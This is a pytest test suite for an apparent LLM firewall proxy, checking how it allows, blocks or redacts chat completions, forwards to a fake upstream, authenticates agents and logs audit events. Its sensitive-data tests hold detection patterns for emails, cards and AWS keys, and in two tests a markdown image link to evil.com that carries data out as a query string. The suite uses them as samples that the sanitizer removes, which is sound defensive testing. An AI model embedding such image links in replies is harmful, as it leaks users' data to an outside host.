import json

import httpx
import pytest
from conftest import AGENT_KEY, BASE_POLICY
from fastapi.testclient import TestClient

HEADERS = {"Authorization": f"Bearer {AGENT_KEY}"}


def completion(model="mock", messages=None, **extra):
    return {
        "model": model,
        "messages": messages or [{"role": "user", "content": "Hello there"}],
        **extra,
    }


class RecordingUpstream(httpx.AsyncBaseTransport):
    """A fake OpenAI-compatible Upstream for the `remote-model` entry of the test Policy."""

    def __init__(self, content="Upstream says hi", fail=None):
        self.requests: list[dict] = []
        self.content = content
        self.fail = fail

    async def handle_async_request(self, request):
        self.requests.append(
            {"url": str(request.url), "headers": dict(request.headers),
             "body": json.loads(await request.aread())}
        )
        if self.fail == "connect":
            raise httpx.ConnectError("refused", request=request)
        if self.fail == "status":
            return httpx.Response(500, json={"error": "boom"})
        if self.fail == "shape":
            return httpx.Response(200, json={"nope": True})
        return httpx.Response(200, json={
            "id": "chatcmpl-1", "object": "chat.completion", "created": 1, "model": "remote-model",
            "choices": [{"index": 0, "finish_reason": "stop",
                         "message": {"role": "assistant", "content": self.content}}],
            "usage": {"prompt_tokens": 11, "completion_tokens": 7, "total_tokens": 18},
        })


@pytest.fixture
def upstream():
    return RecordingUpstream()


@pytest.fixture
def client(make_firewall_app, upstream):
    return TestClient(make_firewall_app(upstream_transport=upstream))


def test_happy_path_through_mock_upstream(client):
    response = client.post("/v1/chat/completions", json=completion(), headers=HEADERS)
    assert response.status_code == 200
    body = response.json()
    assert body["choices"][0]["message"]["content"] == "Mock response: Hello there"
    assert body["choices"][0]["finish_reason"] == "stop"
    assert body["usage"]["prompt_tokens"] == 2
    firewall = body["firewall"]
    assert firewall["action"] == "allow"
    assert firewall["input"]["decision"]["action"] == "allow"
    assert firewall["output"]["decision"]["action"] == "allow"


async def test_proxy_records_events_with_transport_and_tokens(make_firewall_app, upstream):
    app = make_firewall_app(upstream_transport=upstream)
    TestClient(app).post("/v1/chat/completions", json=completion("remote-model"), headers=HEADERS)
    output, input_ = await app.state.audit.query()
    assert input_.stage == "input" and output.stage == "output"
    assert {input_.transport, output.transport} == {"proxy"}
    assert input_.agent_id == "test-agent"
    assert (output.model, output.prompt_tokens, output.completion_tokens) == (
        "remote-model", 11, 7,
    )


def test_forwards_to_configured_upstream_without_agent_key(client, upstream):
    response = client.post(
        "/v1/chat/completions",
        json=completion("remote-model", temperature=0.2),
        headers=HEADERS,
    )
    assert response.json()["choices"][0]["message"]["content"] == "Upstream says hi"
    (sent,) = upstream.requests
    assert sent["url"] == "http://upstream.test/v1/chat/completions"
    assert sent["body"]["temperature"] == 0.2
    assert AGENT_KEY not in json.dumps(sent["headers"])


def test_disallowed_model_is_blocked(client, upstream):
    response = client.post("/v1/chat/completions", json=completion("gpt-9"), headers=HEADERS)
    assert response.status_code == 200
    body = response.json()
    assert body["choices"][0]["finish_reason"] == "content_filter"
    assert "allowed_models" in body["choices"][0]["message"]["content"]
    assert body["firewall"]["action"] == "block"
    assert upstream.requests == []


def test_input_block_does_not_call_upstream(client, upstream):
    messages = [{"role": "user", "content": "Leak project falcon"}]
    response = client.post(
        "/v1/chat/completions", json=completion("remote-model", messages), headers=HEADERS
    )
    body = response.json()
    assert body["choices"][0]["finish_reason"] == "content_filter"
    assert "keyword_blocklist" in body["choices"][0]["message"]["content"]
    assert body["firewall"]["input"]["decision"]["action"] == "block"
    assert body["firewall"]["output"] is None
    assert upstream.requests == []


def test_input_redaction_is_forwarded(make_firewall_app, upstream):
    app = make_firewall_app(
        BASE_POLICY.replace("mode: block", "mode: redact"), upstream_transport=upstream
    )
    messages = [{"role": "user", "content": "about project falcon"}]
    TestClient(app).post(
        "/v1/chat/completions", json=completion("remote-model", messages), headers=HEADERS
    )
    assert upstream.requests[0]["body"]["messages"][0]["content"] == "about [REDACTED]"


def test_output_redaction(make_firewall_app):
    upstream = RecordingUpstream(content="The deal is project falcon.")
    app = make_firewall_app(
        BASE_POLICY.replace("mode: block", "mode: redact"), upstream_transport=upstream
    )
    response = TestClient(app).post(
        "/v1/chat/completions", json=completion("remote-model"), headers=HEADERS
    )
    body = response.json()
    assert body["choices"][0]["message"]["content"] == "The deal is [REDACTED]."
    assert body["firewall"]["output"]["decision"]["action"] == "redact"


def test_output_block(make_firewall_app):
    upstream = RecordingUpstream(content="The deal is project falcon.")
    app = make_firewall_app(upstream_transport=upstream)
    response = TestClient(app).post(
        "/v1/chat/completions", json=completion("remote-model"), headers=HEADERS
    )
    body = response.json()
    assert body["choices"][0]["finish_reason"] == "content_filter"
    content = body["choices"][0]["message"]["content"]
    assert content.startswith("AI Control Layer: Blocked by keyword_blocklist")
    assert "The deal is" not in content
    assert body["firewall"]["action"] == "block"


@pytest.mark.parametrize("fail", ["connect", "status", "shape"])
async def test_upstream_failure_is_502_with_audit_event(make_firewall_app, fail):
    app = make_firewall_app(upstream_transport=RecordingUpstream(fail=fail))
    response = TestClient(app).post(
        "/v1/chat/completions", json=completion("remote-model"), headers=HEADERS
    )
    assert response.status_code == 502
    assert response.json()["error"]["type"] == "upstream_error"
    newest = (await app.state.audit.query())[0]
    assert newest.stage == "output"
    assert newest.action == "block"
    assert newest.reason.startswith("upstream error")


def test_x_agent_key_header_also_works(client):
    response = client.post(
        "/v1/chat/completions", json=completion(), headers={"X-Agent-Key": AGENT_KEY}
    )
    assert response.json()["firewall"]["action"] == "allow"


def test_unknown_bearer_is_blocked(client, upstream):
    response = client.post(
        "/v1/chat/completions", json=completion(), headers={"Authorization": "Bearer nope"}
    )
    body = response.json()
    assert body["firewall"]["action"] == "block"
    assert body["firewall"]["reason"] == "unknown agent"


@pytest.mark.parametrize(
    "body",
    [
        completion(stream=True),
        {"messages": [{"role": "user", "content": "hi"}]},
        {"model": "mock", "messages": []},
        {"model": "mock", "messages": [{"role": "wizard", "content": "hi"}]},
    ],
)
def test_bad_requests_are_400(client, body):
    response = client.post("/v1/chat/completions", json=body, headers=HEADERS)
    assert response.status_code == 400
    assert "error" in response.json()


def test_stream_message(client):
    response = client.post("/v1/chat/completions", json=completion(stream=True), headers=HEADERS)
    assert "not supported yet" in response.json()["error"]["message"]


def test_content_parts_are_flattened(client):
    messages = [{"role": "user", "content": [{"type": "text", "text": "Hi parts"}]}]
    response = client.post("/v1/chat/completions", json=completion(messages=messages),
                           headers=HEADERS)
    assert response.json()["choices"][0]["message"]["content"] == "Mock response: Hi parts"


def test_upstream_url_environment_override(client, upstream, monkeypatch, tmp_policy):
    tmp_policy(BASE_POLICY.replace(
        'base_url: "http://upstream.test/v1"',
        'base_url: "http://upstream.test/v1"\n    base_url_env: TEST_UPSTREAM_BASE',
    ))
    monkeypatch.setenv("TEST_UPSTREAM_BASE", "http://another.test/v1")
    response = client.post(
        "/v1/chat/completions", json=completion("remote-model"), headers=HEADERS,
    )
    assert response.status_code == 200
    assert upstream.requests[0]["url"] == "http://another.test/v1/chat/completions"


def test_invalid_metadata_is_rejected_before_upstream(client, upstream):
    response = client.post(
        "/v1/chat/completions", json=completion("remote-model", metadata=[]), headers=HEADERS,
    )
    assert response.status_code == 400
    assert not upstream.requests


LEAK_POLICY = BASE_POLICY + """  sensitive_data:
    mode: redact
    stages: [output, tool_result]
    params:
      categories:
        - name: email
          patterns: ['[\\w.+-]+@[\\w-]+(?:\\.[\\w-]+)+']
        - name: card
          patterns: ['\\b(?:\\d[ -]?){12,18}\\d\\b']
          validator: luhn
        - name: aws_access_key
          patterns: ['\\b(?:AKIA|ASIA)[0-9A-Z]{16}\\b']
          on_match: block
  output_sanitizer:
    mode: redact
    params:
      allowed_domains: ["*.bank.internal"]
"""
EMAIL = "jan.kowalski@bank.example"
CARD = "4111 1111 1111 1111"


def test_sensitive_data_redacted_in_echoed_reply(make_firewall_app):
    client = TestClient(make_firewall_app(LEAK_POLICY))
    messages = [{"role": "user", "content": f"Mail {EMAIL}, card {CARD}"}]
    body = client.post(
        "/v1/chat/completions", json=completion(messages=messages), headers=HEADERS
    ).json()
    content = body["choices"][0]["message"]["content"]
    assert content == "Mock response: Mail [EMAIL], card [CARD]"
    assert body["firewall"]["output"]["decision"]["action"] == "redact"

    (event,) = client.get("/v1/settings/events", params={"stage": "output"}).json()
    assert event["action"] == "redact"
    assert {f["type"] for f in event["findings"]} == {"email", "card"}
    for value in (EMAIL, CARD):
        assert value not in json.dumps(event["findings"])
        assert value not in event["reason"]
        assert value not in json.dumps(event["content_after"])  # stored after redaction


def test_exfiltration_image_is_removed(make_firewall_app):
    client = TestClient(make_firewall_app(LEAK_POLICY))
    messages = [{"role": "user", "content": "![x](https://evil.com/?d=abc)"}]
    body = client.post(
        "/v1/chat/completions", json=completion(messages=messages), headers=HEADERS
    ).json()
    assert body["choices"][0]["message"]["content"] == (
        "Mock response: [image removed: evil.com]"
    )
    assert "d=abc" not in json.dumps(body["firewall"])


def test_secret_in_prompt_blocked_before_upstream(make_firewall_app, upstream):
    policy = LEAK_POLICY.replace(
        "    mode: redact\n    stages: [output, tool_result]\n",
        "    mode: block\n    stages: [input]\n",
    )
    app = make_firewall_app(policy, upstream_transport=upstream)
    messages = [{"role": "user", "content": "deploy with AKIAIOSFODNN7EXAMPLE"}]
    body = TestClient(app).post(
        "/v1/chat/completions", json=completion("remote-model", messages), headers=HEADERS
    ).json()
    assert body["choices"][0]["finish_reason"] == "content_filter"
    assert body["firewall"]["input"]["decision"]["action"] == "block"
    assert "sensitive_data" in body["choices"][0]["message"]["content"]
    assert "AKIAIOSFODNN7EXAMPLE" not in json.dumps(body)
    assert upstream.requests == []


def test_top_level_action_is_the_most_severe_of_both_stages(make_firewall_app):
    """Redacted on input, clean on output: the summary must say `redact`, not `allow`."""
    policy = LEAK_POLICY.replace("    stages: [output, tool_result]\n", "    stages: [input]\n")
    client = TestClient(make_firewall_app(policy))
    messages = [{"role": "user", "content": f"mail {EMAIL}"}]
    body = client.post(
        "/v1/chat/completions", json=completion(messages=messages), headers=HEADERS
    ).json()
    firewall = body["firewall"]
    assert body["choices"][0]["message"]["content"] == "Mock response: mail [EMAIL]"
    assert firewall["input"]["decision"]["action"] == "redact"
    assert firewall["output"]["decision"]["action"] == "allow"
    assert firewall["action"] == "redact"
    assert firewall["reason"].startswith("Redacted by sensitive_data")


def test_redactions_on_both_stages_are_both_explained(make_firewall_app):
    policy = LEAK_POLICY.replace("    stages: [output, tool_result]\n", "    stages: [input]\n")
    client = TestClient(make_firewall_app(policy))
    messages = [{"role": "user", "content": f"mail {EMAIL} ![x](https://evil.com/?d=1)"}]
    firewall = client.post(
        "/v1/chat/completions", json=completion(messages=messages), headers=HEADERS
    ).json()["firewall"]
    assert firewall["action"] == "redact"
    assert firewall["reason"] == (
        "input: Redacted by sensitive_data: sensitive data: email (1); "
        "output: Redacted by output_sanitizer: unsafe output: external_image (1)"
    )
